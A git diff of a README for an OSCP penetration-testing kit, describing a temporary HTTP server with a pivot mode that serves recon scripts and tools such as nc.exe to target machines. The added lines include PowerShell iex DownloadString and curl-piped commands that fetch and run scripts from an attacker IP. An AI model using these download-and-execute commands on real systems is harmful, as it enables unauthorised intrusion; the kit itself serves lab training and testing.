@@ -9,6 +9,37 @@ Temporary HTTP server and reconnaissance scripts in bash and PowerShell, which w
 1. Run the http temp server on Kali
 ```bash
 python3 ./httpTempServ.py
+Or via .zshrc shortcut: nico.srv
+──────────────────────────────
+    🐉 NICO OSCP QUICK KIT 🐉
+──────────────────────────────
+Server:
+  nico.srv [port]          → Start HTTP server (SHORTCUTS: /recon.ps1 /recon.sh /mm.exe /nc.exe ...)
+  nico.srv [port] [pivot]  → Start HTTP server for Pivot
+The pivot function will update the IP's in the cheatsheet, example:
+                                                                                                                                                                                                                                                             
+┌──(kali㉿kali)-[~/Maquinas/offsec/medtech]
+└─$ nico.srv 2555 192.168.1.23
+
+ -----------------------------------------------------------------------------------------------
+               _  _ ___ ___ ___     ____ _  _ _  _    ____ ____ _  _ ____ ____ 
+               |__|  |   |  |__]    |__| |  |  \/     [__  |__/ |  | |___ |__/ 
+               |  |  |   |  |       |  | |__| _/\_    ___] |  \  \/  |___ |  \ 
+                                                                               
+ -----------------------------------------------------------------------------------------------
+                                                                                     gen0ne@~>
+
+#### 🌐 DOWNLOAD SERVER ACTIVE
+----
+Base URL: http://192.168.1.23:2555/
+
+#### 💀 Recon
+----
+iex ((New-Object System.Net.WebClient).DownloadString('http://192.168.1.23:2555/recon.ps1'))
+iex ((New-Object System.Net.WebClient).DownloadString('http://192.168.1.23:2555/recon-pivot.ps1'))
+. <(curl http://192.168.1.23:2555/recon.sh)
+[..]
+
 ```
 
 2. Load the script on Target Machine
@@ -21,9 +52,17 @@ For Linux
 For Windows
 ```powershell
 iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.ps1'))
+iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon-pivot.ps1'))
+The pivot.ps1 adds the following functions:
+[*] Connection Management:
+    - set.target IP [PORT]            : Set target IP/Port for pivot scenarios
+    - show.target                     : Show current connection settings
+
+Main purpose is to set the pivot IP so it's updated automatically 
+ 
 ```
 
-Example funtions on windows:
+Example functions on windows:
 ```
 PS> iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/recon.ps1'))
 
@@ -90,3 +129,6 @@ PS> iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/re
 
 - On httpTempServ.py add your own into SHORTCUTS dictionary, add your own aliases pointing the file path to quickly access.
 - Make sure that the aliases for recon.sh and recon.ps1 point to the correct path in your file system.
+
+## Thanks
+Thanks to DannyDB for the script, I slightly modified it for my convenience. 
